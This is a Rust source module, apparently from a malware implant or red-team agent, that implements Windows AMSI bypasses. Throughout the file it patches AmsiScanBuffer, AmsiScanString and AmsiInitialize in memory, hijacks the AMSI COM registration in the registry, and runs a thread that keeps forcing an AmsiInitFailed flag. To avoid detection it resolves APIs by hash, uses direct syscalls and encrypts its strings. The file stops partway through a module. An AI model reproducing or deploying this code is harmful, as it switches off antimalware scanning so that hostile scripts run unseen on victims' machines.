//! AMSI (Anti-Malware Scan Interface) bypass strategies.
//!
//! This module provides multiple techniques for bypassing AMSI scanning on
//! Windows. Four bypass strategies are available:
//!
//! 1. **Write-Raid** (`write-raid-amsi` feature): Spawns a race thread that
//!    continuously overwrites the `AmsiInitFailed` flag in amsi.dll's `.data`
//!    section, causing all subsequent `AmsiScanBuffer` calls to return
//!    `AMSI_RESULT_CLEAN`.  No code patches, no hardware breakpoints, no
//!    `VirtualProtect` calls.  **Most stealthy**; preferred when available.
//! 2. **HWBP (Hardware Breakpoint)**: Sets a hardware breakpoint on
//!    `AmsiScanBuffer` to intercept and neutralize scan results. More
//!    OPSEC-safe than memory patching as it does not modify AMSI DLL code.
//! 3. **Memory Patch**: Directly patches `AmsiScanBuffer` in-memory to
//!    return `AMSI_RESULT_CLEAN`. Detectable via code integrity checks.
//! 4. **ETW Patching**: Patches `EtwEventWrite` to suppress event
//!    forwarding to AMSI consumers.
//!
//! All strategies are Windows-only and compile to no-ops on other platforms.

// AMSI Defense
#[cfg(windows)]
use std::ptr;

/// Apply a single AMSI bypass strategy: in-process memory patching of
/// `AmsiScanBuffer`, `AmsiScanString`, and `AmsiInitialize`.
///
/// # Strategy selection
///
/// Three bypass strategies exist in this module:
///
/// 1. **Memory patch** (`apply_memory_patch` + `set_init_failed_flag`): patch
///    the target functions with short-circuit stubs (`xor eax,eax; ret` or
///    `mov eax, E_FAIL; ret`).  Volatile — survives only while the process runs.
///    No persistent artefact. ← **active**
///
/// 2. **COM hijack** (`apply_com_hijack`): write an HKCU registry key that
///    redirects AMSI's COM server to a nonexistent DLL so `AmsiInitialize`
///    fails.  Persistent — leaves a detectable IOC in the registry after
///    the agent exits.  Not applied here; registry artefacts are higher-risk
///    than in-process patches.
///
/// 3. **HWBP/VEH**: hardware-breakpoint + vectored-exception-handler bypass.
///    Stealthier than memory patching (no .text modification) but requires
///    a per-thread setup and interaction with the VEH chain.  Planned for a
///    future release.
///
/// Applying multiple strategies simultaneously increases the attack surface
/// and leaves more detectable artefacts. This function applies strategy 1 only.
#[cfg(windows)]
pub fn orchestrate_layers() -> bool {
    // Single strategy: volatile in-process memory patch.
    apply_memory_patch();
    set_init_failed_flag();
    true
}

#[cfg(not(windows))]
pub fn orchestrate_layers() -> bool {
    true
}

/// Patch AmsiScanBuffer in-process with `xor eax,eax; ret` to force AMSI_RESULT_CLEAN.
///
/// Uses `NtProtectVirtualMemory` via `nt_syscall` instead of `VirtualProtect`
/// to avoid IAT hooks on kernel32's VirtualProtect thunk.
#[cfg(windows)]
fn apply_memory_patch() {
    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};

    /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
    /// Returns `true` on success (NTSTATUS >= 0).
    #[inline(always)]
    unsafe fn nt_protect(base: *mut winapi::ctypes::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
        let mut prot_base = base;
        let mut prot_size = size;
        let status = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            (-1isize) as u64,                      // NtCurrentProcess()
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            new_prot as u64,
            old_prot as *mut u32 as u64,
        );
        status.map_or(false, |s| s >= 0)
    }

    unsafe {
        // Use pe_resolve (PEB walk + hash) to avoid IAT-hookable GetModuleHandleW.
        // If amsi.dll is not already loaded, AMSI is not active and there is
        // nothing to patch.
        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
            Some(b) => b as winapi::shared::minwindef::HMODULE,
            None => {
                log::debug!("apply_memory_patch: amsi.dll not loaded — nothing to patch");
                return;
            }
        };
        let hmod = hmod_base as *mut winapi::ctypes::c_void;

        // Resolve AmsiScanBuffer via hash
        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
        let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_buf_hash)
        {
            Some(addr) => addr as *mut winapi::ctypes::c_void,
            None => {
                log::warn!("apply_memory_patch: AmsiScanBuffer not found");
                return;
            }
        };

        // xor eax, eax (0x31 0xC0) ; ret (0xC3)
        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
        let mut old_protect: u32 = 0;
        if nt_protect(scan_buf, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) {
            std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_buf as *mut u8, patch.len());
            nt_protect(scan_buf, patch.len(), old_protect, &mut old_protect);
            log::debug!("apply_memory_patch: AmsiScanBuffer patched");
        } else {
            log::warn!(
                "apply_memory_patch: NtProtectVirtualMemory failed for AmsiScanBuffer"
            );
        }

        // Also patch AmsiScanString
        let scan_str_hash = pe_resolve::hash_str(b"AmsiScanString\0");
        if let Some(scan_str_addr) =
            pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_str_hash)
        {
            let scan_str = scan_str_addr as *mut winapi::ctypes::c_void;
            let mut op: u32 = 0;
            if nt_protect(scan_str, patch.len(), PAGE_EXECUTE_READWRITE, &mut op) {
                std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_str as *mut u8, patch.len());
                nt_protect(scan_str, patch.len(), op, &mut op);
            }
        }
        let _ = hmod;
    }
}

#[cfg(windows)]
fn apply_com_hijack() {
    use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, HKEY_CURRENT_USER};

    let subkey =
        b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
    // Point to a nonexistent path so AMSI COM initialisation fails cleanly (2.11)
    let default_val = b"C:\\Windows\\System32\\amsi_disabled.dll\0";

    unsafe {
        let mut hkey = ptr::null_mut();
        if RegCreateKeyExA(
            HKEY_CURRENT_USER,
            subkey.as_ptr() as _,
            0,
            ptr::null_mut(),
            0,
            winapi::um::winnt::KEY_WRITE,
            ptr::null_mut(),
            &mut hkey,
            ptr::null_mut(),
        ) == 0
        {
            RegSetValueExA(
                hkey,
                ptr::null(),
                0,
                winapi::um::winnt::REG_SZ,
                default_val.as_ptr(),
                (default_val.len() - 1) as u32,
            );
            winapi::um::winreg::RegCloseKey(hkey);
        }
    }
}

/// Remove the registry key created by `apply_com_hijack` to avoid leaving a
/// detectable COM-hijack artefact after the bypass is no longer needed.
#[cfg(windows)]
pub fn cleanup_com_hijack() {
    use winapi::um::winreg::{RegDeleteKeyA, HKEY_CURRENT_USER};
    // Delete leaf key first; parent keys are harmless to leave (they are empty
    // standard Windows registry nodes).
    let leaf =
        b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
    let parent = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\0";
    unsafe {
        RegDeleteKeyA(HKEY_CURRENT_USER, leaf.as_ptr() as _);
        RegDeleteKeyA(HKEY_CURRENT_USER, parent.as_ptr() as _);
    }
}

/// Set the g_AmsiContext initialization flag to indicate failure so any
/// AmsiInitialize call in the current process reports an error.
///
/// Uses `NtProtectVirtualMemory` via `nt_syscall` instead of `VirtualProtect`
/// to avoid IAT hooks on kernel32's VirtualProtect thunk.
#[cfg(windows)]
fn set_init_failed_flag() {
    /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
    /// Returns `true` on success (NTSTATUS >= 0).
    #[inline(always)]
    unsafe fn nt_protect(base: *mut winapi::ctypes::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
        let mut prot_base = base;
        let mut prot_size = size;
        let status = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            (-1isize) as u64,                      // NtCurrentProcess()
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            new_prot as u64,
            old_prot as *mut u32 as u64,
        );
        status.map_or(false, |s| s >= 0)
    }

    unsafe {
        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
            Some(b) => b,
            None => return,
        };

        // AmsiInitialize is __fastcall on x64; the caller cleans the stack so
        // a single-byte RET (0xC3) is the correct return form.
        // mov eax, 0x80004005 ; ret  => B8 05 40 00 80 C3
        let init_hash = pe_resolve::hash_str(b"AmsiInitialize\0");
        let init_fn = match pe_resolve::get_proc_address_by_hash(hmod_base, init_hash) {
            Some(addr) => addr as *mut winapi::ctypes::c_void,
            None => return,
        };

        let patch: [u8; 6] = [
            0xB8, 0x05, 0x40, 0x00, 0x80, // mov eax, 0x80004005 (E_FAIL)
            0xC3, // ret
        ];
        let mut old: u32 = 0;
        if nt_protect(
            init_fn,
            patch.len(),
            winapi::um::winnt::PAGE_EXECUTE_READWRITE,
            &mut old,
        ) {
            std::ptr::copy_nonoverlapping(patch.as_ptr(), init_fn as *mut u8, patch.len());
            nt_protect(init_fn, patch.len(), old, &mut old);
            log::debug!("set_init_failed_flag: AmsiInitialize patched to return E_FAIL");
        } else {
            log::warn!(
                "set_init_failed_flag: NtProtectVirtualMemory failed for AmsiInitialize"
            );
        }
    }
}

/// Verify AMSI bypass by checking that all three patched functions
/// (AmsiScanBuffer, AmsiScanString, AmsiInitialize) start with the expected
/// patch bytes.
///
/// Returns `true` if amsi.dll is not loaded (trivially successful) or if
/// all three functions are confirmed patched.  Returns `false` if any
/// function's patch does not match.
#[cfg(windows)]
pub fn verify_bypass() -> bool {
    unsafe {
        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
            Some(b) => b,
            None => return true, // amsi.dll not loaded = bypass trivially successful
        };

        // Helper: resolve a function by hash and read `n` bytes from its entry.
        // Returns `None` if the function is not found (treated as OK).
        let resolve_bytes = |name_hash: u32, n: usize| -> Option<(Vec<u8>, *const u8)> {
            let addr = pe_resolve::get_proc_address_by_hash(hmod_base, name_hash)?;
            let ptr = addr as *const u8;
            Some((std::slice::from_raw_parts(ptr, n).to_vec(), ptr))
        };

        // ── AmsiScanBuffer ─────────────────────────────────────────────────
        // Patched with `xor eax,eax; ret` (31 C0 C3) — 3 bytes, but we read
        // 6 to also accept the `mov eax,0; ret` form (B8 00 00 00 00 C3).
        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
        if let Some((bytes, ptr)) = resolve_bytes(scan_buf_hash, 6) {
            let ok = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3) // xor eax,eax; ret
                || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3) // xor alt encoding; ret
                || (bytes[0] == 0xB8
                    && bytes[1] == 0x00
                    && bytes[2] == 0x00
                    && bytes[3] == 0x00
                    && bytes[4] == 0x00
                    && bytes[5] == 0xC3); // mov eax,0; ret
            if !ok {
                log::warn!(
                    "verify_bypass: AmsiScanBuffer not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
                );
                return false;
            }
            let _ = ptr;
        }

        // ── AmsiScanString ─────────────────────────────────────────────────
        // Patched with `xor eax,eax; ret` (31 C0 C3) — same pattern.
        let scan_str_hash = pe_resolve::hash_str(b"AmsiScanString\0");
        if let Some((bytes, ptr)) = resolve_bytes(scan_str_hash, 6) {
            let ok = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
                || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
                || (bytes[0] == 0xB8
                    && bytes[1] == 0x00
                    && bytes[2] == 0x00
                    && bytes[3] == 0x00
                    && bytes[4] == 0x00
                    && bytes[5] == 0xC3);
            if !ok {
                log::warn!(
                    "verify_bypass: AmsiScanString not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
                );
                return false;
            }
            let _ = ptr;
        }

        // ── AmsiInitialize ─────────────────────────────────────────────────
        // Patched with `mov eax, 0x80004005; ret`
        // (B8 05 40 00 80 C3) — 6 bytes.
        let init_hash = pe_resolve::hash_str(b"AmsiInitialize\0");
        if let Some((bytes, ptr)) = resolve_bytes(init_hash, 6) {
            let ok = bytes[0] == 0xB8
                && bytes[1] == 0x05
                && bytes[2] == 0x40
                && bytes[3] == 0x00
                && bytes[4] == 0x80
                && bytes[5] == 0xC3;
            if !ok {
                log::warn!(
                    "verify_bypass: AmsiInitialize not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
                );
                return false;
            }
            let _ = ptr;
        }

        true
    }
}

#[cfg(not(windows))]
pub fn verify_bypass() -> bool {
    true
}

// ─── Write-Raid AMSI bypass ─────────────────────────────────────────────────
//
// Instead of patching AMSI code or setting breakpoints, exploit a race
// condition in AMSI's initialization sequence.  Locate the
// `AmsiInitFailed` flag in amsi.dll's .data section and continuously
// overwrite it with 1.  This causes all subsequent `AmsiScanBuffer` calls
// to short-circuit and return `AMSI_RESULT_CLEAN` (0) immediately.
//
// Detection evasion:
//   - Zero VirtualProtect / NtProtectVirtualMemory calls
//   - Zero code page modifications (integrity checks pass)
//   - Zero hardware breakpoint registers set
//   - The .data section write blends with normal AMSI state updates
//
// Gated behind the `write-raid-amsi` feature flag.

/// Handle to the active write-raid thread.  `None` when the bypass is
/// inactive.  Protected by a mutex so that `enable` / `disable` / `status`
/// are safe to call from any thread.
#[cfg(all(windows, feature = "write-raid-amsi"))]
mod write_raid {
    use super::*;
    use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
    use std::sync::Mutex;

    /// AMSI_RESULT_CLEAN — the value we want every scan to return.
    const AMSI_RESULT_CLEAN: u32 = 0;

    // ── Shared state ───────────────────────────────────────────────────

    /// Address of the `AmsiInitFailed` flag inside amsi.dll's .data section.
    /// Discovered once at enable time.  `0` means not yet resolved.
    static INIT_FAILED_ADDR: AtomicU64 = AtomicU64::new(0);

    /// Address of the `g_amsiSession` result field, used as a secondary
    /// race target.  `0` means not yet resolved.
    static SESSION_RESULT_ADDR: AtomicU64 = AtomicU64::new(0);

    /// Thread handle for the write-raid loop (Windows HANDLE stored as u64).
    static RAID_THREAD_HANDLE: AtomicU64 = AtomicU64::new(0);

    /// Thread ID of the write-raid thread, stored so we can terminate it.
    static RAID_THREAD_ID: AtomicU64 = AtomicU64::new(0);

    /// Flag signalling the write-raid thread to stop.  Set to `true` on
    /// disable.  The write-raid thread polls this on every iteration.
    static STOP_REQUESTED: AtomicBool = AtomicBool::new(false);

    /// Flag signalling the write-raid thread to pause (sleep obfuscation is
    /// about to encrypt agent memory).  The thread spins in a yield loop
    /// while this is `true`.
    static PAUSE_REQUESTED: AtomicBool = AtomicBool::new(false);

    /// Whether the write-raid bypass is currently active.
    static ACTIVE: AtomicBool = AtomicBool::new(false);

    /// Mutex to serialize enable/disable calls.
    static LOCK: Mutex<()> = Mutex::new(());

    // ── AMSI context structure offsets ─────────────────────────────────
    //
    // These are determined empirically for Windows 10/11 amsi.dll versions.
    // The `AmsiInitFailed` flag is a `BOOL` in the .data section at a fixed
    // offset from the module base for a given amsi.dll build.  We locate it
    // by scanning the .data section for the known initialization pattern.

    /// Size of the region we are willing to scan in the .data section.
    const DATA_SCAN_LIMIT: usize = 0x2000;

    /// Locate the `AmsiInitFailed` flag within amsi.dll's .data section.
    ///
    /// Strategy: resolve `AmsiInitialize` export.  The function references
    /// the `AmsiInitFailed` flag via a `lea` or `mov` instruction that uses
    /// a RIP-relative offset.  We scan the first 128 bytes of
    /// `AmsiInitialize` for a `mov [rip+offset], value` or
    /// `lea reg, [rip+offset]` pattern pointing into the `.data` section.
    ///
    /// If that fails, fall back to scanning the `.data` section for a
    /// 4-byte region that is initially 0 and is within the first 8 KiB.
    unsafe fn find_init_failed_flag(amsi_base: usize) -> Option<usize> {
        let init_hash = pe_resolve::hash_str(b"AmsiInitialize\0");
        let init_fn = pe_resolve::get_proc_address_by_hash(amsi_base, init_hash)?;

        // Scan first 128 bytes of AmsiInitialize for RIP-relative
        // instructions that store into the .data section.
        let bytes = std::slice::from_raw_parts(init_fn as *const u8, 128);

        // Pattern 1: C7 05 XX XX XX XX 01 00 00 00
        //   mov dword ptr [rip+disp32], 1  (sets AmsiInitFailed = TRUE)
        for i in 0..bytes.len().saturating_sub(9) {
            if bytes[i] == 0xC7 && bytes[i + 1] == 0x05 {
                let disp = i32::from_le_bytes([
                    bytes[i + 2],
                    bytes[i + 3],
                    bytes[i + 4],
                    bytes[i + 5],
                ]);
                // The immediate must be 1 (setting the flag to TRUE).
                let imm = u32::from_le_bytes([
                    bytes[i + 6],
                    bytes[i + 7],
                    bytes[i + 8],
                    bytes[i + 9],
                ]);
                if imm == 1 {
                    let rip_after_insn = init_fn + i + 10;
                    let target = (rip_after_insn as i64 + disp as i64) as usize;
                    // Verify the target is within the amsi module range.
                    if is_within_amsi_data(amsi_base, target) {
                        log::debug!(
                            "write_raid: found AmsiInitFailed at {:#x} via mov [rip+disp], 1",
                            target
                        );
                        return Some(target);
                    }
                }
            }
        }

        // Pattern 2: 88 05 XX XX XX XX  (mov byte ptr [rip+disp32], al)
        // or  C6 05 XX XX XX XX 01     (mov byte ptr [rip+disp32], 1)
        for i in 0..bytes.len().saturating_sub(6) {
            if bytes[i] == 0xC6 && bytes[i + 1] == 0x05 {
                let disp = i32::from_le_bytes([
                    bytes[i + 2],
                    bytes[i + 3],
                    bytes[i + 4],
                    bytes[i + 5],
                ]);
                let rip_after_insn = init_fn + i + 6;
                let target = (rip_after_insn as i64 + disp as i64) as usize;
                if is_within_amsi_data(amsi_base, target) {
                    log::debug!(
                        "write_raid: found candidate AmsiInitFailed at {:#x} via mov byte [rip+disp]",
                        target
                    );
                    return Some(target);
                }
            }
        }

        log::warn!("write_raid: could not locate AmsiInitFailed via pattern scan");
        None
    }

    /// Check whether `addr` falls within the `.data` section of amsi.dll.
    unsafe fn is_within_amsi_data(amsi_base: usize, addr: usize) -> bool {
        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};

        let dos = &*(amsi_base as *const IMAGE_DOS_HEADER);
        if dos.e_magic != 0x5A4D {
            return false;
        }
        let nt = &*((amsi_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
        let section_offset = dos.e_lfanew as usize
            + std::mem::size_of::<IMAGE_NT_HEADERS64>()
            - std::mem::size_of::<winapi::um::winnt::IMAGE_DATA_DIRECTORY>()
            + nt.OptionalHeader.NumberOfRvaAndSizes as usize
            * std::mem::size_of::<winapi::um::winnt::IMAGE_DATA_DIRECTORY>();

        // Walk section headers.
        let n_sections = nt.FileHeader.NumberOfSections as usize;
        let section_size = std::mem::size_of::<winapi::um::winnt::IMAGE_SECTION_HEADER>();
        let sections_ptr = (amsi_base + dos.e_lfanew as usize
            + std::mem::size_of::<u32>() // Signature
            + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
            + nt.FileHeader.SizeOfOptionalHeader as usize) as *const winapi::um::winnt::IMAGE_SECTION_HEADER;

        for i in 0..n_sections {
            let sec = &*sections_ptr.add(i);
            let sec_start = amsi_base + sec.VirtualAddress as usize;
            let sec_end = sec_start + sec.Misc.VirtualSize as usize;
            if addr >= sec_start && addr < sec_end {
                // Check if this is a writable data section.
                let chars = sec.Characteristics as u32;
                // .data section: IMAGE_SCN_MEM_WRITE (0x80000000) set
                if chars & 0x80000000 != 0 {
                    return true;
                }
            }
        }
        false
    }

    /// Write-raid thread entry point.
    ///
    /// Continuously overwrites the `AmsiInitFailed` flag with 1 and the
    /// session result with `AMSI_RESULT_CLEAN` (0).  Uses
    /// `NtWriteVirtualMemory` on the current process (via indirect syscall)
    /// so that the writes look like cross-process operations from EDR's
    /// perspective.  Yields with `NtDelayExecution(0)` between iterations.
    ///
    /// # Safety
    ///
    /// Must only be called from the thread created by `enable_write_raid`.
    unsafe fn write_raid_loop() {
        let init_failed_ptr = INIT_FAILED_ADDR.load(Ordering::Relaxed) as *mut u32;
        let session_ptr = SESSION_RESULT_ADDR.load(Ordering::Relaxed) as *mut u32;

        let has_init = !init_failed_ptr.is_null();
        let has_session = !session_ptr.is_null();

        if !has_init && !has_session {
            log::error!("write_raid: no valid targets — thread exiting");
            ACTIVE.store(false, Ordering::Release);
            return;
        }

        // Use NtWriteVirtualMemory on NtCurrentProcess so the writes appear
        // as cross-process operations (not simple pointer dereferences that
        // EDR can intercept via copy-on-write page faults).
        let ntdll_hash = pe_resolve::hash_str(
            &string_crypt::enc_str!("ntdll.dll\0"),
        );
        let ntdll_base = match pe_resolve::get_module_handle_by_hash(ntdll_hash) {
            Some(b) => b,
            None => {
                log::error!("write_raid: cannot resolve ntdll — thread exiting");
                ACTIVE.store(false, Ordering::Release);
                return;
            }
        };

        let write_vmem_hash = pe_resolve::hash_str(
            &string_crypt::enc_str!("NtWriteVirtualMemory\0"),
        );
        let write_vmem_fn = match pe_resolve::get_proc_address_by_hash(ntdll_base, write_vmem_hash)
        {
            Some(a) => a,
            None => {
                log::error!("write_raid: cannot resolve NtWriteVirtualMemory — thread exiting");
                ACTIVE.store(false, Ordering::Release);
                return;
            }
        };

        // Also resolve NtDelayExecution for yielding.
        let delay_hash = pe_resolve::hash_str(
            &string_crypt::enc_str!("NtDelayExecution\0"),
        );
        let delay_fn = pe_resolve::get_proc_address_by_hash(ntdll_base, delay_hash);

        log::info!("write_raid: race thread started");

        while !STOP_REQUESTED.load(Ordering::Relaxed) {
            // ── Pause gate ──────────────────────────────────────────────
            // Sleep obfuscation sets PAUSE_REQUESTED before encrypting
            // agent memory.  We must not touch AMSI memory while it is
            // encrypted or the writes will corrupt the ciphertext.
            if PAUSE_REQUESTED.load(Ordering::Relaxed) {
                // Spin-yield until the pause is lifted.
                while PAUSE_REQUESTED.load(Ordering::Relaxed)
                    && !STOP_REQUESTED.load(Ordering::Relaxed)
                {
                    unsafe {
                        winapi::um::synchapi::SwitchToThread();
                    }
                }
                // Either pause was lifted or stop was requested.
                if STOP_REQUESTED.load(Ordering::Relaxed) {
                    break;
                }
                continue;
            }

            // Write 1 to AmsiInitFailed — causes all scans to return CLEAN.
            if has_init {
                let value: u32 = 1;
                let mut bytes_written: usize = 0;
                let status = nt_syscall::syscall!(
                    "NtWriteVirtualMemory",
                    (-1isize) as u64, // NtCurrentProcess()
                    init_failed_ptr as u64,
                    &value as *const u32 as u64,
                    std::mem::size_of::<u32>() as u64,
                    &mut bytes_written as *mut usize as u64,
                );
                if let Ok(s) = status {
                    if s < 0 {
                        // NtWriteVirtualMemory failed — fall back to direct write.
                        *init_failed_ptr = 1;
                    }
                }
            }

            // Overwrite session result field with AMSI_RESULT_CLEAN.
            if has_session {
                let value: u32 = AMSI_RESULT_CLEAN;
                let mut bytes_written: usize = 0;
                let status = nt_syscall::syscall!(
                    "NtWriteVirtualMemory",
                    (-1isize) as u64,
                    session_ptr as u64,
                    &value as *const u32 as u64,
                    std::mem::size_of::<u32>() as u64,
                    &mut bytes_written as *mut usize as u64,
                );
                if let Ok(s) = status {
                    if s < 0 {
                        *session_ptr = AMSI_RESULT_CLEAN;
                    }
                }
            }

            // Yield: NtDelayExecution with 0ns delay.
            if let Some(addr) = delay_fn {
                let nt_delay: extern "system" fn(u8, *mut i64) -> i32 =
                    std::mem::transmute(addr);
                let mut delay_100ns: i64 = 0; // 0 = yield
                nt_delay(0, &mut delay_100ns);
            } else {
                // Fallback: kernel32 SwitchToThread.
                winapi::um::synchapi::SwitchToThread();
            }
        }

        log::info!("write_raid: race thread exiting (stop requested)");
        ACTIVE.store(false, Ordering::Release);
    }

    /// Locate the AMSI session result field as a secondary race target.
    ///
    /// `AmsiScanBuffer` writes its result to a field inside the
    /// `HAMSICONTEXT` structure.  We resolve `AmsiScanBuffer` and scan its
    /// prologue for `mov [reg+offset], eax` patterns that store the result.
    /// The `reg` points into a heap allocation, so we can't resolve the
    /// absolute address statically.  Instead, we locate a well-known global
    /// pointer (`g_amsiSession` or equivalent) that holds the context.
    ///
    /// For the write-raid technique, the `AmsiInitFailed` flag alone is
    /// sufficient — if it is set to 1, `AmsiScanBuffer` returns
    /// `AMSI_RESULT_CLEAN` without ever touching the session.  This secondary
    /// target is a belt-and-suspenders approach.
    unsafe fn find_session_result_field(_amsi_base: usize) -> Option<usize> {
        // The session result field lives on the heap, not at a fixed address.
        // We skip this secondary target for now — the AmsiInitFailed flag
        // is sufficient for the bypass.
        None
    }

    // ── Public API ─────────────────────────────────────────────────────

    /// Enable the write-raid AMSI bypass.
    ///
    /// Resolves amsi.dll, locates the `AmsiInitFailed` flag, and spawns a
    /// background thread that continuously overwrites it with 1.  If the
    /// bypass is already active, returns `Ok(())` without starting a new
    /// thread.
    ///
    /// # Errors
    ///
    /// Returns an error if amsi.dll is not loaded or the flag cannot be
    /// located.
    pub fn enable() -> anyhow::Result<()> {
        let _guard = LOCK.lock().map_err(|e| anyhow::anyhow!("lock poisoned: {e}"))?;

        if ACTIVE.load(Ordering::Acquire) {
            log::debug!("write_raid: already active — skipping");
            return Ok(());
        }

        unsafe {
            // Resolve amsi.dll base.
            let amsi_hash = pe_resolve::hash_str(
                &string_crypt::enc_str!("amsi.dll\0"),
            );
            let amsi_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
                Some(b) => b,
                None => {
                    return Err(anyhow::anyhow!(
                        "amsi.dll not loaded — AMSI is not active, bypass not needed"
                    ))
                }
            };

            // Locate the AmsiInitFailed flag.
            let flag_addr = find_init_failed_flag(amsi_base).ok_or_else(|| {
                anyhow::anyhow!(
                    "could not locate AmsiInitFailed flag in amsi.dll .data section"
                )
            })?;

            INIT_FAILED_ADDR.store(flag_addr as u64, Ordering::Release);

            // Try to locate secondary target (optional).
            if let Some(session_addr) = find_session_result_field(amsi_base) {
                SESSION_RESULT_ADDR.store(session_addr as u64, Ordering::Release);
            }

            STOP_REQUESTED.store(false, Ordering::Release);

            // Spawn the write-raid thread.
            // Use CreateThread via syscall to avoid IAT hooks.
            let thread_proc: extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(write_raid_thread_entry as usize);

            let ntdll_hash = pe_resolve::hash_str(
                &string_crypt::enc_str!("ntdll.dll\0"),
            );
            let ntdll_base = pe_resolve::get_module_handle_by_hash(ntdll_hash)
                .ok_or_else(|| anyhow::anyhow!("ntdll not found"))?;

            let create_thread_hash = pe_resolve::hash_str(
                &string_crypt::enc_str!("NtCreateThreadEx\0"),
            );

            let mut thread_handle: u64 = 0;
            let create_status = nt_syscall::syscall!(
                "NtCreateThreadEx",
                &mut thread_handle as *mut u64 as u64, // ThreadHandle
                0x1FFFFFu64,                            // DesiredAccess (THREAD_ALL_ACCESS)
                0u64,                                    // ObjectAttributes
                (-1isize) as u64,                        // ProcessHandle (current)
                thread_proc as *mut std::ffi::c_void as u64, // StartRoutine
                0u64,                                    // Argument
                0u64,                                    // CreateFlags (run immediately)
                0u64,                                    // ZeroBits
                0u64,                                    // StackSize
                0u64,                                    // MaximumStackSize
                0u64,                                    // AttributeList
            );

            match create_status {
                Ok(status) if status >= 0 => {
                    RAID_THREAD_HANDLE.store(thread_handle, Ordering::Release);
                    ACTIVE.store(true, Ordering::Release);

                    // Register the write-raid thread with sleep obfuscation so
                    // it pauses during sleep encryption cycles.  The thread ID
                    // is stored after the thread is created.
                    // NOTE: We use NtQueryInformationThread to get the TID.
                    let tid = get_thread_id(thread_handle);
                    RAID_THREAD_ID.store(tid, Ordering::Release);

                    log::info!(
                        "write_raid: enabled — AmsiInitFailed at {:#x}, thread handle {:#x}, tid {}",
                        flag_addr, thread_handle, tid
                    );
                    Ok(())
                }
                Ok(status) => {
                    Err(anyhow::anyhow!(
                        "NtCreateThreadEx returned NTSTATUS {:#x}",
                        status
                    ))
                }
                Err(e) => Err(anyhow::anyhow!("NtCreateThreadEx failed: {e}")),
            }
        }
    }

    /// Disable the write-raid AMSI bypass.
    ///
    /// Signals the write-raid thread to stop and waits for it to exit.
    /// Restores the original `AmsiInitFailed` value (0).
    pub fn disable() -> anyhow::Result<()> {
        let _guard = LOCK.lock().map_err(|e| anyhow::anyhow!("lock poisoned: {e}"))?;

        if !ACTIVE.load(Ordering::Acquire) {
            log::debug!("write_raid: not active — nothing to disable");
            return Ok(());
        }

        // Signal the thread to stop.
        STOP_REQUESTED.store(true, Ordering::Release);

        // Wait for the thread to acknowledge (spin with yield).
        for _ in 0..200 {
            if !ACTIVE.load(Ordering::Acquire) {
                break;
            }
            unsafe {
                winapi::um::synchapi::SwitchToThread();
            }
        }

        // If the thread is still running, terminate it.
        if ACTIVE.load(Ordering::Acquire) {
            let handle = RAID_THREAD_HANDLE.load(Ordering::Acquire);
            if handle != 0 {
                unsafe {
                    let _ = nt_syscall::syscall!(
                        "NtTerminateThread",
                        handle,
                        0u64,
                    );
                }
            }
            ACTIVE.store(false, Ordering::Release);
        }

        // Clean up the thread handle.
        let handle = RAID_THREAD_HANDLE.swap(0, Ordering::AcqRel);
        if handle != 0 {
            unsafe {
                pe_resolve::close_handle(handle as *mut std::ffi::c_void);
            }
        }

        // Restore the AmsiInitFailed flag to 0 (not failed).
        let flag_addr = INIT_FAILED_ADDR.swap(0, Ordering::AcqRel);
        if flag_addr != 0 {
            unsafe {
                let ptr = flag_addr as *mut u32;
                *ptr = 0;
            }
        }

        SESSION_RESULT_ADDR.store(0, Ordering::Release);
        RAID_THREAD_ID.store(0, Ordering::Release);

        log::info!("write_raid: disabled");
        Ok(())
    }

    /// Return whether the write-raid bypass is currently active.
    pub fn is_active() -> bool {
        ACTIVE.load(Ordering::Acquire)
    }
